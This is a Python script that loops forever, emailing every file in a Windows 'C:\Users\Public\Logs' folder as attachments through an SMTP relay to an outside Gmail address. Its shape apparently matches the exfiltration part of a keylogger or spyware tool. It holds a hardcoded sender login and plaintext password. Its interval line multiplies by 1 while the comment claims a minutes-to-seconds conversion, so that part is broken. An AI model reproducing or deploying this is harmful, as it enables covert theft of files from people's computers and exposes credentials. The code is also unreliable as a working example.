import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import time
import os

def send_email(file_path, sender_email, receiver_email, smtp_server, smtp_port, sender_password):
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = "File Attachment"

    # Get a list of all files in the directory
    files = os.listdir(file_path)

    for file_name in files:
        file_full_path = os.path.join(file_path, file_name)
        with open(file_full_path, "rb") as attachment:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(attachment.read())
        
        encoders.encode_base64(part)
        part.add_header(
            "Content-Disposition",
            f"attachment; filename= {file_name}",
        )
        msg.attach(part)

    with smtplib.SMTP(smtp_server, smtp_port) as server:
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, receiver_email, msg.as_string())

# Configuration
file_path = r"C:\Users\Public\Logs"  # Adjust the file path as needed
sender_email = "ips.csit.pascal@gmail.com"
receiver_email = "risandddd@gmail.com"
smtp_server = "relay.brevo.com"
smtp_port = 587
sender_password = "sameer@12April2002"
interval_minutes = 60  # Adjust the interval as needed

while True:
    send_email(file_path, sender_email, receiver_email, smtp_server, smtp_port, sender_password)
    print("Email sent successfully!")

    time.sleep(interval_minutes * 1)  # Convert minutes to seconds for time.sleep
